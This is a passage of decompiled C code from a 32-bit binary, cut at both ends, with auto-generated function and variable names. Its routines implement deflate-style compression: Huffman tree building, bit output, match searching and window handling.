  for (iVar6 = *(int *)(unaff_ESI + 0x18f8) / 2; 0 < iVar6; iVar6 = iVar6 + -1) {
    FUN_003aa580(iVar6);
  }
  do {
    uVar3 = *(undefined4 *)(unaff_ESI + 0x1004 + *(int *)(unaff_ESI + 0x18f8) * 4);
    iVar6 = *(int *)(unaff_ESI + 0x1008);
    *(int *)(unaff_ESI + 0x18f8) = *(int *)(unaff_ESI + 0x18f8) + -1;
    *(undefined4 *)(unaff_ESI + 0x1008) = uVar3;
    FUN_003aa580(1);
    iVar4 = *(int *)(unaff_ESI + 0x1008);
    *(int *)(unaff_ESI + 0x18fc) = *(int *)(unaff_ESI + 0x18fc) + -1;
    *(int *)(unaff_ESI + 0x1004 + *(int *)(unaff_ESI + 0x18fc) * 4) = iVar6;
    *(int *)(unaff_ESI + 0x18fc) = *(int *)(unaff_ESI + 0x18fc) + -1;
    *(int *)(unaff_ESI + 0x1004 + *(int *)(unaff_ESI + 0x18fc) * 4) = iVar4;
    *(short *)(iVar2 + local_c * 4) = *(short *)(iVar2 + iVar4 * 4) + *(short *)(iVar2 + iVar6 * 4);
    bVar1 = *(byte *)(unaff_ESI + 0x1900 + iVar4);
    bVar5 = *(byte *)(unaff_ESI + 0x1900 + iVar6);
    if (bVar5 < bVar1) {
      bVar5 = bVar1;
    }
    *(byte *)(unaff_ESI + 0x1900 + local_c) = bVar5 + 1;
    *(short *)(iVar2 + 2 + iVar4 * 4) = (short)local_c;
    *(short *)(iVar2 + 2 + iVar6 * 4) = (short)local_c;
    *(int *)(unaff_ESI + 0x1008) = local_c;
    local_c = local_c + 1;
    FUN_003aa580(1);
  } while (1 < *(int *)(unaff_ESI + 0x18f8));
  *(int *)(unaff_ESI + 0x18fc) = *(int *)(unaff_ESI + 0x18fc) + -1;
  *(undefined4 *)(unaff_ESI + 0x1004 + *(int *)(unaff_ESI + 0x18fc) * 4) =
       *(undefined4 *)(unaff_ESI + 0x1008);
  FUN_003aa660(param_1);
  FUN_003aa870(extraout_ECX,unaff_ESI,local_8);
  return;
}



void __thiscall FUN_003aaaf0(void *this,int param_1)

{
  short *psVar1;
  ushort uVar2;
  int in_EAX;
  int iVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  int local_10;
  uint local_c;
  ushort *local_8;
  
  uVar2 = *(ushort *)((int)this + 2);
  iVar4 = 0;
  local_c = 0xffffffff;
  iVar3 = 7;
  iVar7 = 4;
  if (uVar2 == 0) {
    iVar3 = 0x8a;
    iVar7 = 3;
  }
  *(undefined2 *)((int)this + in_EAX * 4 + 6) = 0xffff;
  if (-1 < in_EAX) {
    local_8 = (ushort *)((int)this + 6);
    local_10 = in_EAX + 1;
    uVar5 = (uint)uVar2;
    do {
      uVar6 = (uint)*local_8;
      iVar4 = iVar4 + 1;
      if ((iVar3 <= iVar4) || (uVar5 != uVar6)) {
        if (iVar4 < iVar7) {
          psVar1 = (short *)(param_1 + 0xef4 + uVar5 * 4);
          *psVar1 = *psVar1 + (short)iVar4;
        }
        else {
          if (uVar5 == 0) {
            if (iVar4 < 0xb) {
              *(short *)(param_1 + 0xf38) = *(short *)(param_1 + 0xf38) + 1;
            }
            else {
              *(short *)(param_1 + 0xf3c) = *(short *)(param_1 + 0xf3c) + 1;
            }
          }
          else {
            if (uVar5 != local_c) {
              psVar1 = (short *)(param_1 + 0xef4 + uVar5 * 4);
              *psVar1 = *psVar1 + 1;
            }
            *(short *)(param_1 + 0xf34) = *(short *)(param_1 + 0xf34) + 1;
          }
        }
        iVar4 = 0;
        local_c = uVar5;
        if (uVar6 == 0) {
          iVar3 = 0x8a;
          iVar7 = 3;
        }
        else {
          if (uVar5 == uVar6) {
            iVar3 = 6;
            iVar7 = 3;
          }
          else {
            iVar3 = 7;
            iVar7 = 4;
          }
        }
      }
      local_8 = local_8 + 2;
      local_10 = local_10 + -1;
      uVar5 = uVar6;
    } while (local_10 != 0);
  }
  return;
}



void __cdecl FUN_003aabd0(ushort *param_1,int param_2)

{
  ushort *puVar1;
  int in_EAX;
  int iVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int local_c;
  uint local_8;
  
  puVar1 = param_1 + 1;
  iVar5 = 0;
  local_8 = 0xffffffff;
  iVar2 = 7;
  iVar3 = 4;
  if (*puVar1 == 0) {
    iVar2 = 0x8a;
    iVar3 = 3;
  }
  if (-1 < param_2) {
    param_1 = param_1 + 3;
    local_c = param_2 + 1;
    uVar6 = (uint)*puVar1;
    do {
      uVar4 = (uint)*param_1;
      iVar5 = iVar5 + 1;
      if ((iVar2 <= iVar5) || (uVar6 != uVar4)) {
        if (iVar5 < iVar3) {
          do {
            FUN_003ab3d0((uint)*(ushort *)(in_EAX + 0xef6 + uVar6 * 4));
            iVar5 = iVar5 + -1;
          } while (iVar5 != 0);
        }
        else {
          if (uVar6 == 0) {
            if (iVar5 < 0xb) {
              FUN_003ab3d0((uint)*(ushort *)(in_EAX + 0xf3a));
              iVar2 = 3;
            }
            else {
              FUN_003ab3d0((uint)*(ushort *)(in_EAX + 0xf3e));
              iVar2 = 7;
            }
          }
          else {
            if (uVar6 != local_8) {
              FUN_003ab3d0((uint)*(ushort *)(in_EAX + 0xef6 + uVar6 * 4));
            }
            FUN_003ab3d0((uint)*(ushort *)(in_EAX + 0xf36));
            iVar2 = 2;
          }
          FUN_003ab3d0(iVar2);
        }
        iVar5 = 0;
        local_8 = uVar6;
        if (uVar4 == 0) {
          iVar2 = 0x8a;
          iVar3 = 3;
        }
        else {
          if (uVar6 == uVar4) {
            iVar2 = 6;
            iVar3 = 3;
          }
          else {
            iVar2 = 7;
            iVar3 = 4;
          }
        }
      }
      param_1 = param_1 + 2;
      local_c = local_c + -1;
      uVar6 = uVar4;
    } while (local_c != 0);
  }
  return;
}



void FUN_003aad20(void)

{
  int in_EAX;
  int iVar1;
  
  FUN_003aaaf0((void *)(in_EAX + 0x14),in_EAX);
  FUN_003aaaf0((void *)(in_EAX + 0x908),in_EAX);
  FUN_003aa900((int *)(in_EAX + 0xfc8));
  iVar1 = 0x12;
  do {
    if (*(short *)(in_EAX + 0xef6 + (uint)(byte)(&DAT_003ce8c4)[iVar1] * 4) != 0) {
LAB_003aaddb:
      *(int *)(in_EAX + 0x1af3c) = *(int *)(in_EAX + 0x1af3c) + iVar1 * 3 + 0x11;
      return;
    }
    if (*(short *)(in_EAX + 0xef6 + (uint)(byte)(&UNK_003ce8c3)[iVar1] * 4) != 0) {
      *(int *)(in_EAX + 0x1af3c) = *(int *)(in_EAX + 0x1af3c) + (iVar1 + -1) * 3 + 0x11;
      return;
    }
    if (*(short *)(in_EAX + 0xef6 + (uint)(byte)(&UNK_003ce8c2)[iVar1] * 4) != 0) {
      *(int *)(in_EAX + 0x1af3c) = *(int *)(in_EAX + 0x1af3c) + (iVar1 + -2) * 3 + 0x11;
      return;
    }
    if (*(short *)(in_EAX + 0xef6 + (uint)(byte)(&UNK_003ce8c1)[iVar1] * 4) != 0) {
      iVar1 = iVar1 + -3;
      goto LAB_003aaddb;
    }
    iVar1 = iVar1 + -4;
    if (iVar1 < 3) {
      *(int *)(in_EAX + 0x1af3c) = *(int *)(in_EAX + 0x1af3c) + iVar1 * 3 + 0x11;
      return;
    }
  } while( true );
}



void __cdecl FUN_003aadf0(int param_1,int param_2)

{
  int in_EAX;
  int unaff_EBX;
  int iVar1;
  
  FUN_003ab3d0(5);
  FUN_003ab3d0(5);
  FUN_003ab3d0(4);
  iVar1 = 0;
  if (0 < unaff_EBX) {
    do {
      FUN_003ab3d0(3);
      iVar1 = iVar1 + 1;
    } while (iVar1 < unaff_EBX);
  }
  FUN_003aabd0((ushort *)(in_EAX + 0x14),param_1 + -1);
  FUN_003aabd0((ushort *)(in_EAX + 0x908),param_2 + -1);
  return;
}



int __thiscall FUN_003aae80(void *this,undefined4 *param_1)

{
  int in_EAX;
  uint uVar1;
  uint uVar2;
  int unaff_EDI;
  
  *(undefined *)(*(int *)((int)this + 0x1af34) + 0x19f2c + (int)this) =
       *(undefined *)((int)this + 0x1af38);
  if (**(short **)((int)this + 0x1af50) == -1) {
    FUN_003ab320();
  }
  FUN_003aa900((int *)((int)this + 0xf90));
  FUN_003aa900((int *)((int)this + 0xfac));
  FUN_003aad20();
  *(int *)((int)this + 0x1af4c) = *(int *)((int)this + 0x1af4c) + in_EAX;
  uVar1 = *(int *)((int)this + 0x1af3c) + 10U >> 3;
  uVar2 = *(int *)((int)this + 0x1af40) + 10U >> 3;
  if (uVar2 <= uVar1) {
    uVar1 = uVar2;
  }
  if ((uVar1 < in_EAX + 4U) || (param_1 == (undefined4 *)0x0)) {
    if (uVar2 == uVar1) {
      FUN_003ab3d0(3);
      FUN_003ab1e0((int)this + 0x9fc,(int)this + 0xe7c);
      uVar1 = *(int *)((int)this + 0x1af48) + 3 + *(int *)((int)this + 0x1af40);
      *(int *)((int)this + 0x1af44) = *(int *)((int)this + 0x1af44) + (uVar1 >> 3);
    }
    else {
      FUN_003ab3d0(3);
      FUN_003aadf0(*(int *)((int)this + 0xfa8) + 1,*(int *)((int)this + 0xfc4) + 1);
      FUN_003ab1e0((int)this + 0x14,(int)this + 0x908);
      uVar1 = *(int *)((int)this + 0x1af48) + 3 + *(int *)((int)this + 0x1af3c);
      *(int *)((int)this + 0x1af44) = *(int *)((int)this + 0x1af44) + (uVar1 >> 3);
    }
    *(uint *)((int)this + 0x1af48) = uVar1 & 7;
  }
  else {
    FUN_003ab3d0(3);
    *(int *)((int)this + 0x1af44) =
         *(int *)((int)this + 0x1af44) + (*(int *)((int)this + 0x1af48) + 10U >> 3) + 4 + in_EAX;
    *(undefined4 *)((int)this + 0x1af48) = 0;
    FUN_003ab550(param_1);
  }
  FUN_003aa4f0();
  if (unaff_EDI != 0) {
    FUN_003ab470();
    *(int *)((int)this + 0x1af48) = *(int *)((int)this + 0x1af48) + 7;
  }
  return (*(uint *)((int)this + 0x1af48) >> 3) + *(int *)((int)this + 0x1af44);
}



undefined4 __fastcall FUN_003ab020(int param_1,int param_2)

{
  short *psVar1;
  int in_EAX;
  byte bVar2;
  int *piVar3;
  ushort *puVar4;
  int iVar5;
  int local_c;
  int local_8;
  
  *(char *)(param_1 + 0x1f2c + *(int *)(param_1 + 0x1af2c)) = (char)param_2;
  *(int *)(param_1 + 0x1af2c) = *(int *)(param_1 + 0x1af2c) + 1;
  if (in_EAX == 0) {
    psVar1 = (short *)(param_1 + 0x14 + param_2 * 4);
    *psVar1 = *psVar1 + 1;
  }
  else {
    psVar1 = (short *)(param_1 + 0x418 + (uint)*(byte *)(param_1 + 0x1b3d + param_2) * 4);
    *psVar1 = *psVar1 + 1;
    iVar5 = in_EAX + -1;
    if (iVar5 < 0x100) {
      bVar2 = *(byte *)(param_1 + 0x1c3d + iVar5);
    }
    else {
      bVar2 = *(byte *)((iVar5 >> 7) + 0x1d3d + param_1);
    }
    psVar1 = (short *)(param_1 + 0x908 + (uint)bVar2 * 4);
    *psVar1 = *psVar1 + 1;
    *(short *)(param_1 + 0x9f2c + *(int *)(param_1 + 0x1af30) * 2) = (short)iVar5;
    *(int *)(param_1 + 0x1af30) = *(int *)(param_1 + 0x1af30) + 1;
    *(byte *)(param_1 + 0x1af38) = *(byte *)(param_1 + 0x1af38) | *(byte *)(param_1 + 0x1af39);
  }
  *(char *)(param_1 + 0x1af39) = *(char *)(param_1 + 0x1af39) << 1;
  if ((*(byte *)(param_1 + 0x1af2c) & 7) == 0) {
    *(undefined *)(*(int *)(param_1 + 0x1af34) + 0x19f2c + param_1) =
         *(undefined *)(param_1 + 0x1af38);
    *(int *)(param_1 + 0x1af34) = *(int *)(param_1 + 0x1af34) + 1;
    *(undefined2 *)(param_1 + 0x1af38) = 0x100;
  }
  if ((2 < *(int *)(param_1 + 4)) && ((*(uint *)(param_1 + 0x1af2c) & 0xfff) == 0)) {
    iVar5 = *(uint *)(param_1 + 0x1af2c) * 8;
    local_c = 0;
    local_8 = 0;
    piVar3 = &DAT_003ce8dc;
    puVar4 = (ushort *)(param_1 + 0x90c);
    do {
      iVar5 = iVar5 + (uint)puVar4[-2] * (piVar3[-1] + 5);
      local_8 = local_8 + (*piVar3 + 5) * (uint)*puVar4;
      local_c = local_c + (uint)puVar4[2] * (piVar3[1] + 5);
      piVar3 = piVar3 + 3;
      puVar4 = puVar4 + 6;
    } while ((int)piVar3 < 0x3ce954);
    if ((*(uint *)(param_1 + 0x1af30) < *(uint *)(param_1 + 0x1af2c) >> 1) &&
       (((uint)(iVar5 + local_8 + local_c) >> 2 & 0x3ffffffe) <
        (*(int *)(param_1 + 0x6af84) - *(int *)(param_1 + 0x6af74) & 0xfffffffeU))) {
      return 1;
    }
  }
  if ((*(int *)(param_1 + 0x1af2c) != 0x7fff) && (*(int *)(param_1 + 0x1af30) != 0x8000)) {
    return 0;
  }
  return 1;
}



void __cdecl FUN_003ab1e0(int param_1,int param_2)

{
  ushort uVar1;
  byte bVar2;
  int in_EAX;
  uint uVar3;
  uint uVar4;
  ushort *local_10;
  int local_c;
  byte local_5;
  
  uVar3 = 0;
  local_c = 0;
  local_5 = 0;
  if (*(int *)(in_EAX + 0x1af2c) != 0) {
    local_10 = (ushort *)(in_EAX + 0x9f2c);
    do {
      if ((uVar3 & 7) == 0) {
        local_5 = *(byte *)(local_c + 0x19f2c + in_EAX);
        local_c = local_c + 1;
      }
      uVar4 = (uint)*(byte *)(in_EAX + 0x1f2c + uVar3);
      uVar3 = uVar3 + 1;
      if ((local_5 & 1) == 0) {
        uVar4 = (uint)*(ushort *)(param_1 + 2 + uVar4 * 4);
LAB_003ab2e0:
        FUN_003ab3d0(uVar4);
      }
      else {
        uVar4 = (uint)*(byte *)(uVar4 + 0x1b3d + in_EAX);
        FUN_003ab3d0((uint)*(ushort *)(param_1 + 0x406 + uVar4 * 4));
        if ((&DAT_003ce850)[uVar4] != 0) {
          FUN_003ab3d0((&DAT_003ce850)[uVar4]);
        }
        uVar1 = *local_10;
        local_10 = local_10 + 1;
        if (uVar1 < 0x100) {
          bVar2 = *(byte *)(uVar1 + 0x1c3d + in_EAX);
        }
        else {
          bVar2 = *(byte *)((uVar1 >> 7) + 0x1d3d + in_EAX);
        }
        FUN_003ab3d0((uint)*(ushort *)(param_2 + 2 + (uint)bVar2 * 4));
        uVar4 = (&DAT_003ce8d8)[bVar2];
        if (uVar4 != 0) goto LAB_003ab2e0;
      }
      local_5 = local_5 >> 1;
    } while (uVar3 < *(uint *)(in_EAX + 0x1af2c));
  }
  FUN_003ab3d0((uint)*(ushort *)(param_1 + 0x402));
  return;
}



void FUN_003ab320(void)

{
  int in_EAX;
  ushort *puVar1;
  int iVar2;
  int iVar3;
  int local_10;
  int local_c;
  int local_8;
  
  iVar3 = 0;
  iVar2 = 0;
  puVar1 = (ushort *)(in_EAX + 0x34);
  local_c = 0x3c;
  do {
    iVar3 = iVar3 + (uint)puVar1[-2];
    iVar2 = iVar2 + (uint)*puVar1;
    puVar1 = puVar1 + 4;
    local_c = local_c + -1;
  } while (local_c != 0);
  local_8 = 0;
  local_c = 0;
  puVar1 = (ushort *)(in_EAX + 0x218);
  local_10 = 0x40;
  do {
    local_8 = local_8 + (uint)puVar1[-2];
    local_c = local_c + (uint)*puVar1;
    puVar1 = puVar1 + 4;
    local_10 = local_10 + -1;
  } while (local_10 != 0);
  **(ushort **)(in_EAX + 0x1af50) =
       (ushort)((uint)*(ushort *)(in_EAX + 0x2c) + (uint)*(ushort *)(in_EAX + 0x28) +
                (uint)*(ushort *)(in_EAX + 0x24) + (uint)*(ushort *)(in_EAX + 0x20) +
                (uint)*(ushort *)(in_EAX + 0x1c) + (uint)*(ushort *)(in_EAX + 0x18) +
                (uint)*(ushort *)(in_EAX + 0x14) + local_c + local_8 <=
               (uint)*(ushort *)(in_EAX + 0x210) + iVar2 + iVar3 >> 2);
  return;
}



void __cdecl FUN_003ab3d0(int param_1)

{
  uint *puVar1;
  int iVar2;
  uint in_EAX;
  int iVar3;
  undefined4 *unaff_ESI;
  
  iVar2 = unaff_ESI[0x6bd7];
  unaff_ESI[0x6bdb] = unaff_ESI[0x6bdb] + param_1;
  iVar3 = param_1 + iVar2;
  unaff_ESI[0x6bd7] = iVar3;
  unaff_ESI[0x6bd6] = unaff_ESI[0x6bd6] | in_EAX << ((byte)iVar2 & 0x1f);
  if (0x10 < iVar3) {
    puVar1 = unaff_ESI + 0x6bd9;
    if (unaff_ESI[0x6bda] - 1 <= *puVar1) {
      (*(code *)unaff_ESI[4])(*unaff_ESI,unaff_ESI[0x6bd8],puVar1);
    }
    *(undefined *)(unaff_ESI[0x6bd8] + *puVar1) = *(undefined *)(unaff_ESI + 0x6bd6);
    *puVar1 = *puVar1 + 1;
    *(undefined *)(*puVar1 + unaff_ESI[0x6bd8]) = *(undefined *)((int)unaff_ESI + 0x1af59);
    unaff_ESI[0x6bd7] = unaff_ESI[0x6bd7] + -0x10;
    *puVar1 = *puVar1 + 1;
    unaff_ESI[0x6bd6] = in_EAX >> ((char)param_1 - (char)unaff_ESI[0x6bd7] & 0x1fU);
  }
  return;
}



void FUN_003ab470(void)

{
  uint *puVar1;
  undefined4 *unaff_ESI;
  
  if ((int)unaff_ESI[0x6bd7] < 9) {
    if ((int)unaff_ESI[0x6bd7] < 1) goto LAB_003ab504;
    if ((uint)unaff_ESI[0x6bda] <= (uint)unaff_ESI[0x6bd9]) {
      (*(code *)unaff_ESI[4])(*unaff_ESI,unaff_ESI[0x6bd8],unaff_ESI + 0x6bd9);
    }
    *(undefined *)(unaff_ESI[0x6bd8] + unaff_ESI[0x6bd9]) = *(undefined *)(unaff_ESI + 0x6bd6);
  }
  else {
    puVar1 = unaff_ESI + 0x6bd9;
    if (unaff_ESI[0x6bda] - 1 <= *puVar1) {
      (*(code *)unaff_ESI[4])(*unaff_ESI,unaff_ESI[0x6bd8],puVar1);
    }
    *(undefined *)(unaff_ESI[0x6bd8] + *puVar1) = *(undefined *)(unaff_ESI + 0x6bd6);
    *puVar1 = *puVar1 + 1;
    *(undefined *)(*puVar1 + unaff_ESI[0x6bd8]) = *(undefined *)((int)unaff_ESI + 0x1af59);
  }
  unaff_ESI[0x6bd9] = unaff_ESI[0x6bd9] + 1;
LAB_003ab504:
  if (unaff_ESI[0x6bd5] != 0) {
    (*(code *)unaff_ESI[4])(*unaff_ESI,unaff_ESI[0x6bd8],unaff_ESI + 0x6bd9);
  }
  unaff_ESI[0x6bd6] = 0;
  unaff_ESI[0x6bd7] = 0;
  unaff_ESI[0x6bdb] = unaff_ESI[0x6bdb] + 7 & 0xfffffff8;
  return;
}



void __cdecl FUN_003ab550(undefined4 *param_1)

{
  uint *puVar1;
  uint uVar2;
  undefined4 *in_EAX;
  byte bVar3;
  uint unaff_EBX;
  
  FUN_003ab470();
  puVar1 = in_EAX + 0x6bd9;
  if (in_EAX[0x6bda] - 1 <= *puVar1) {
    (*(code *)in_EAX[4])(*in_EAX,in_EAX[0x6bd8],puVar1);
  }
  *(byte *)(in_EAX[0x6bd8] + *puVar1) = (byte)unaff_EBX;
  *puVar1 = *puVar1 + 1;
  bVar3 = (byte)(unaff_EBX >> 8);
  *(byte *)(*puVar1 + in_EAX[0x6bd8]) = bVar3;
  *puVar1 = *puVar1 + 1;
  if (in_EAX[0x6bda] - 1 <= *puVar1) {
    (*(code *)in_EAX[4])(*in_EAX,in_EAX[0x6bd8],puVar1);
  }
  *(byte *)(in_EAX[0x6bd8] + *puVar1) = ~(byte)unaff_EBX;
  *puVar1 = *puVar1 + 1;
  *(byte *)(*puVar1 + in_EAX[0x6bd8]) = ~bVar3;
  *puVar1 = *puVar1 + 1;
  in_EAX[0x6bdb] = in_EAX[0x6bdb] + 0x20;
  if (in_EAX[0x6bd5] != 0) {
    (*(code *)in_EAX[4])(*in_EAX,in_EAX[0x6bd8],puVar1);
    *puVar1 = unaff_EBX;
    (*(code *)in_EAX[4])(*in_EAX,param_1,puVar1);
    in_EAX[0x6bdb] = in_EAX[0x6bdb] + unaff_EBX * 8;
    return;
  }
  uVar2 = *puVar1 + unaff_EBX;
  if (uVar2 < (uint)in_EAX[0x6bda] || uVar2 == in_EAX[0x6bda]) {
    FUN_003aee70((undefined4 *)(in_EAX[0x6bd8] + *puVar1),param_1,unaff_EBX);
    *puVar1 = *puVar1 + unaff_EBX;
    in_EAX[0x6bdb] = in_EAX[0x6bdb] + unaff_EBX * 8;
    return;
  }
  in_EAX[0x6bdb] = in_EAX[0x6bdb] + unaff_EBX * 8;
  return;
}



void __thiscall FUN_003ab670(void *this,ushort *param_1)

{
  int in_EAX;
  uint uVar1;
  
  *(undefined4 *)((int)this + 0x6af78) = 0;
  if (*(int *)((int)this + 0x6af70) == 0) {
    *(undefined4 *)((int)this + 0x6af78) = 1;
    *(undefined4 *)((int)this + 0x6af70) = 0x10000;
  }
  *(undefined4 *)((int)this + 0x6af6c) = 0;
  trim_string((undefined (*) [16])((int)this + 0x4af70),0,0x1fffc);
  *(uint *)((int)this + 0x6af98) = (uint)*(ushort *)(&DAT_003ce9a2 + in_EAX * 8);
  *(uint *)((int)this + 0x6af9c) = (uint)*(ushort *)(&DAT_003ce9a0 + in_EAX * 8);
  *(uint *)((int)this + 0x6afa0) = (uint)*(ushort *)(&DAT_003ce9a4 + in_EAX * 8);
  *(uint *)((int)this + 0x6af94) = (uint)*(ushort *)(&DAT_003ce9a6 + in_EAX * 8);
  if (in_EAX < 3) {
    *param_1 = *param_1 | 4;
  }
  else {
    if (7 < in_EAX) {
      *param_1 = *param_1 | 2;
    }
  }
  *(undefined4 *)((int)this + 0x6af84) = 0;
  *(undefined4 *)((int)this + 0x6af74) = 0;
  uVar1 = (**(code **)((int)this + 0xc))(this,(byte *)((int)this + 0x1af70),0x10000);
  *(uint *)((int)this + 0x6af90) = uVar1;
  if ((uVar1 != 0) && (uVar1 != 0xffffffff)) {
    *(undefined4 *)((int)this + 0x6af8c) = 0;
    if (uVar1 < 0x106) {
      FUN_003ab8f0();
    }
    *(undefined4 *)((int)this + 0x6af7c) = 0;
    uVar1 = (uint)*(byte *)((int)this + 0x1af70);
    *(uint *)((int)this + 0x6af7c) = uVar1;
    *(uint *)((int)this + 0x6af7c) = (uint)*(byte *)((int)this + 0x1af71) ^ uVar1 << 5;
    return;
  }
  *(undefined4 *)((int)this + 0x6af90) = 0;
  *(undefined4 *)((int)this + 0x6af8c) = 1;
  return;
}



uint FUN_003ab7a0(void)

{
  char *pcVar1;
  char *pcVar2;
  uint in_EAX;
  char *pcVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  int unaff_ESI;
  uint uVar7;
  uint local_14;
  uint local_c;
  char local_6;
  char local_5;
  
  local_c = *(uint *)(unaff_ESI + 0x6af94);
  uVar6 = *(uint *)(unaff_ESI + 0x6af84);
  uVar7 = *(uint *)(unaff_ESI + 0x6af80);
  pcVar3 = (char *)(uVar6 + 0x1af70 + unaff_ESI);
  if (uVar6 < 0x7efb) {
    local_14 = 0;
  }
  else {
    local_14 = uVar6 - 0x7efa;
  }
  pcVar2 = (char *)(uVar6 + 0x1b072 + unaff_ESI);
  local_5 = pcVar3[uVar7 - 1];
  local_6 = pcVar3[uVar7];
  if (*(uint *)(unaff_ESI + 0x6af9c) <= uVar7) {
    local_c = local_c >> 2;
  }
  do {
    pcVar5 = (char *)(unaff_ESI + 0x1af70 + in_EAX);
    if ((((pcVar5[uVar7] == local_6) && (pcVar5[uVar7 - 1] == local_5)) && (*pcVar5 == *pcVar3)) &&
       (pcVar5[1] == pcVar3[1])) {
      pcVar3 = pcVar3 + 2;
      pcVar5 = pcVar5 + 2;
      while (((((pcVar4 = pcVar3 + 1, pcVar3[1] == pcVar5[1] &&
                (pcVar4 = pcVar3 + 2, pcVar3[2] == pcVar5[2])) &&
               ((pcVar4 = pcVar3 + 3, pcVar3[3] == pcVar5[3] &&
                ((pcVar4 = pcVar3 + 4, pcVar3[4] == pcVar5[4] &&
                 (pcVar4 = pcVar3 + 5, pcVar3[5] == pcVar5[5])))))) &&
              (pcVar4 = pcVar3 + 6, pcVar3[6] == pcVar5[6])) &&
             (pcVar4 = pcVar3 + 7, pcVar3[7] == pcVar5[7]))) {
        pcVar1 = pcVar3 + 8;
        pcVar3 = pcVar3 + 8;
        pcVar5 = pcVar5 + 8;
        pcVar4 = pcVar3;
        if ((*pcVar1 != *pcVar5) || (pcVar2 <= pcVar3)) break;
      }
      uVar6 = ((int)pcVar4 - (int)pcVar2) + 0x102;
      pcVar3 = pcVar2 + -0x102;
      if ((int)uVar7 < (int)uVar6) {
        *(uint *)(unaff_ESI + 0x6af88) = in_EAX;
        if (*(int *)(unaff_ESI + 0x6afa0) <= (int)uVar6) {
          return uVar6;
        }
        local_5 = pcVar3[((int)pcVar4 - (int)pcVar2) + 0x101];
        local_6 = pcVar3[uVar6];
        uVar7 = uVar6;
      }
    }
    in_EAX = *(uint *)(unaff_ESI + 0x2af70 + (in_EAX & 0x7fff) * 4);
    if (in_EAX <= local_14) {
      return uVar7;
    }
    local_c = local_c - 1;
    if (local_c == 0) {
      return uVar7;
    }
  } while( true );
}



void FUN_003ab8f0(void)

{
  uint *puVar1;
  int iVar2;
  uint uVar3;
  int unaff_ESI;
  
  while( true ) {
    if ((((*(int *)(unaff_ESI + 0x6af70) - *(uint *)(unaff_ESI + 0x6af84)) -
          *(int *)(unaff_ESI + 0x6af90) != -1) && (0xfef9 < *(uint *)(unaff_ESI + 0x6af84))) &&
       (*(int *)(unaff_ESI + 0x6af78) != 0)) {
      FUN_003aee70((undefined4 *)(unaff_ESI + 0x1af70),(undefined4 *)(unaff_ESI + 0x22f70),0x8000);
      *(int *)(unaff_ESI + 0x6af88) = *(int *)(unaff_ESI + 0x6af88) + -0x8000;
      *(int *)(unaff_ESI + 0x6af84) = *(int *)(unaff_ESI + 0x6af84) + -0x8000;
      *(int *)(unaff_ESI + 0x6af74) = *(int *)(unaff_ESI + 0x6af74) + -0x8000;
      puVar1 = (uint *)(unaff_ESI + 0x4af70);
      iVar2 = 0x8000;
      do {
        if (*puVar1 < 0x8000) {
          uVar3 = 0;
        }
        else {
          uVar3 = *puVar1 - 0x8000;
        }
        *puVar1 = uVar3;
        puVar1 = puVar1 + 1;
        iVar2 = iVar2 + -1;
      } while (iVar2 != 0);
      puVar1 = (uint *)(unaff_ESI + 0x2af70);
      iVar2 = 0x8000;
      do {
        if (*puVar1 < 0x8000) {
          uVar3 = 0;
        }
        else {
          uVar3 = *puVar1 - 0x8000;
        }
        *puVar1 = uVar3;
        puVar1 = puVar1 + 1;
        iVar2 = iVar2 + -1;
      } while (iVar2 != 0);
    }
    if (*(int *)(unaff_ESI + 0x6af8c) != 0) break;
    iVar2 = (**(code **)(unaff_ESI + 0xc))();
    if ((iVar2 == 0) || (iVar2 == -1)) {
      *(undefined4 *)(unaff_ESI + 0x6af8c) = 1;
    }
    else {
      *(int *)(unaff_ESI + 0x6af90) = *(int *)(unaff_ESI + 0x6af90) + iVar2;
    }
    if (0x105 < *(uint *)(unaff_ESI + 0x6af90)) {
      return;
    }
    if (*(int *)(unaff_ESI + 0x6af8c) != 0) {
      return;
    }
  }
  return;
}



void FUN_003aba30(void)

{
  void *in_EAX;
  uint uVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  int local_8;
  
  local_8 = 0;
  *(undefined4 *)((int)in_EAX + 0x6af80) = 2;
  if (*(int *)((int)in_EAX + 0x6af90) != 0) {
    uVar4 = 0;
    do {
      if (2 < *(uint *)((int)in_EAX + 0x6af90)) {
        uVar1 = ((uint)*(byte *)(*(uint *)((int)in_EAX + 0x6af84) + 0x1af72 + (int)in_EAX) ^
                *(int *)((int)in_EAX + 0x6af7c) << 5) & 0x7fff;
        *(uint *)((int)in_EAX + 0x6af7c) = uVar1;
        local_8 = *(int *)((int)in_EAX + uVar1 * 4 + 0x4af70);
        *(int *)((int)in_EAX + (*(uint *)((int)in_EAX + 0x6af84) & 0x7fff) * 4 + 0x2af70) = local_8;
        *(undefined4 *)((int)in_EAX + *(int *)((int)in_EAX + 0x6af7c) * 4 + 0x4af70) =
             *(undefined4 *)((int)in_EAX + 0x6af84);
      }
      if ((local_8 != 0) && ((uint)(*(int *)((int)in_EAX + 0x6af84) - local_8) < 0x7efb)) {
        uVar4 = *(uint *)((int)in_EAX + 0x6af90);
        if (uVar4 <= *(uint *)((int)in_EAX + 0x6afa0) && *(uint *)((int)in_EAX + 0x6afa0) != uVar4)
        {
          *(uint *)((int)in_EAX + 0x6afa0) = uVar4;
        }
        uVar4 = FUN_003ab7a0();
        if (*(uint *)((int)in_EAX + 0x6af90) < uVar4) {
          uVar4 = *(uint *)((int)in_EAX + 0x6af90);
        }
      }
      if (uVar4 < 3) {
        iVar2 = FUN_003ab020((int)in_EAX,
                             (uint)*(byte *)(*(int *)((int)in_EAX + 0x6af84) + 0x1af70 + (int)in_EAX
                                            ));
        *(int *)((int)in_EAX + 0x6af90) = *(int *)((int)in_EAX + 0x6af90) + -1;
        *(int *)((int)in_EAX + 0x6af84) = *(int *)((int)in_EAX + 0x6af84) + 1;
      }
      else {
        iVar2 = FUN_003ab020((int)in_EAX,uVar4 - 3);
        *(int *)((int)in_EAX + 0x6af90) = *(int *)((int)in_EAX + 0x6af90) - uVar4;
        if ((uVar4 < *(uint *)((int)in_EAX + 0x6af98) || uVar4 == *(uint *)((int)in_EAX + 0x6af98))
           && (2 < *(uint *)((int)in_EAX + 0x6af90))) {
          uVar4 = uVar4 - 1;
          do {
            *(int *)((int)in_EAX + 0x6af84) = *(int *)((int)in_EAX + 0x6af84) + 1;
            uVar1 = ((uint)*(byte *)((int)in_EAX + *(uint *)((int)in_EAX + 0x6af84) + 0x1af72) ^
